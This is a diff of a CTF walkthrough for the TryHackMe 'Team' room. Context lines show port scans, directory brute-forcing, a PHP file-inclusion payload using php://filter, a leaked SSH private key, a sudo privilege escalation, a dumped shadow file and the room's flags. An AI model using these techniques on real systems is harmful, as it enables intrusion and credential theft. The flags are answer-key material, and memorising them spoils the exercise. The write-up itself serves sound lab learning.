@@ -6,7 +6,6 @@ _Created by:﻿dalemazza_
 
 _Credit to P41ntP4rr0t for help along the way_
 
-
 ```
 ┌──(kali㉿kali)-[~]
 └─$ rustscan -a 10.10.167.117 --ulimit 5500 -b 65535 -- -A
@@ -116,7 +115,6 @@ ftp> quit
 
 <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
 
-
 ┌──(kali㉿kali)-[~]
 └─$ tail /etc/hosts                         
 10.129.132.154 unika.htb
@@ -174,7 +172,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.2
 [####################] - 1m     18856/18856   0s      found:15      errors:3      
 [####################] - 1m     18856/18856   282/s   http://team.thm/scripts/ 
 
-
 #!/bin/bash
 read -p "Enter Username: " REDACTED
 read -sp "Enter Username Password: " REDACTED
@@ -196,7 +193,6 @@ quit
 
 # Updated version of the script
 # Note to self had to change the extension of the old "script" in this folder, as it has creds in
-
 
 ┌──(kali㉿kali)-[~]
 └─$ feroxbuster -t 64 -u http://team.thm/scripts/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak,old,new 
@@ -304,7 +300,6 @@ Also as per the team policy please make a copy of your "id_rsa" and place this i
 
 Gyles 
 
-
 ┌──(kali㉿kali)-[~]
 └─$ tail /etc/hosts
 10.129.105.231 thetoppers.htb
@@ -354,7 +349,6 @@ http://dev.team.thm/script.php?page=php://filter/read=convert.base64-encode/reso
 </html>
 
 http://dev.team.thm/script.php?page=php://filter/read=convert.base64-encode/resource=script.php
-
 
 ┌──(kali㉿kali)-[~]
 └─$ echo 'Cjw/cGhwICAgCiRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgidGVhbXNoYXJlLnBocCIpOwogICB9Cj8+Cg==' | base64 -d
@@ -489,7 +483,6 @@ b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
 CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
 -----END OPENSSH PRIVATE KEY-----
 
-
 ┌──(kali㉿kali)-[~/team]
 └─$ chmod 600 id_rsa 
                                                                                                           
@@ -554,7 +547,6 @@ El script hace lo siguiente:
 7.  Almacena la fecha actual en una variable llamada "date_save" en el formato "AAAA-MM-DD-HH-MM".
 8.  Hace una copia de seguridad del archivo /var/stats/stats.txt en un archivo llamado /var/stats/stats-AAAA-MM-DD-HH-MM.bak utilizando la variable "date_save".
 9.  Muestra un mensaje que dice "Las estadísticas han sido respaldadas".
-
 
 dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
 Reading stats.
@@ -712,16 +704,6 @@ sshd:*:18642:0:99999:7:::
 
 ```
 
-![[Pasted image 20221222232514.png]]
-
-![[Pasted image 20221222235959.png]]
-
-![[Pasted image 20221223002308.png]]
-
-![[Pasted image 20221223002513.png]]
-
-![[Pasted image 20221223003101.png]]
-
 user.txt
 As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"
 *THM{6Y0TXHz7c2d}*
@@ -729,6 +711,5 @@ As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This 
 root.txt
 Is root running anything automated? ps I like PATH s
 *THM{fhqbznavfonq}*
-
 
 [[Ra 2]]
